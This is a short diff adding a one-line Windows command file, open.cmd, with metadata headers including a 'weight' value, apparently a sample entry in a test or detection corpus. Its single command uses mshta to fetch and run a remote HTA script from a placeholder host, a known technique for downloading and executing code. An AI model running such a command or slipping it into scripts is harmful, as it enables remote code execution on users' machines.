@@ -1,0 +1,5 @@
+# path: open.cmd
+# lines: 1
+# weight: 35
+# ---
+mshta https://example.invalid/page.hta
